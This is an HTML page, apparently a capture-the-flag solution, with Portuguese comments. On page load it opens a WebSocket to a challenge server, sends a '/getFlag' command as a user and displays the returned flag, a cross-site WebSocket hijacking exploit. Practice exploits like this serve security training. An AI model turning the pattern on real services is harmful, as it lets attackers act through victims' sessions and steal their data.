<!DOCTYPE html>
<html>
  <head>
    <title>WebSocket Flag Capture</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        max-width: 800px;
        margin: 0 auto;
        padding: 20px;
      }
      #log {
        border: 1px solid #ccc;
        padding: 15px;
        height: 300px;
        overflow-y: auto;
        margin-bottom: 20px;
        background-color: #f9f9f9;
      }
      .flag {
        color: red;
        font-weight: bold;
        font-size: 18px;
      }
      h1 {
        color: #333;
      }
    </style>
  </head>
  <body>
    <h1>WebSocket Exploit</h1>
    <div id="log"></div>

    <script>
      const logElement = document.getElementById("log");

      function log(message, isFlag = false) {
        const entry = document.createElement("div");
        if (isFlag) {
          entry.className = "flag";
        }
        entry.textContent = message;
        logElement.appendChild(entry);
        logElement.scrollTop = logElement.scrollHeight;
      }

      log("Iniciando exploit...");

      // Conectar ao WebSocket do alvo
      const socket = new WebSocket("wss://wembsoncket.chal.cyberjousting.com");

      socket.onopen = function () {
        log("Conexão WebSocket estabelecida!");

        // Enviar comando para obter a flag
        setTimeout(function () {
          log("Enviando comando /getFlag...");
          socket.send(
            JSON.stringify({
              sender: "user",
              message: "/getFlag",
            })
          );
        }, 1000);
      };

      socket.onmessage = function (event) {
        const data = JSON.parse(event.data);
        log("Recebido: " + data.message);

        // Destacar a flag se ela for encontrada
        if (data.message.includes("Flag:")) {
          log("FLAG ENCONTRADA: " + data.message, true);
        }
      };

      socket.onerror = function (error) {
        log("Erro na conexão WebSocket: " + error);
      };

      socket.onclose = function () {
        log("Conexão WebSocket fechada");
      };
    </script>
  </body>
</html>
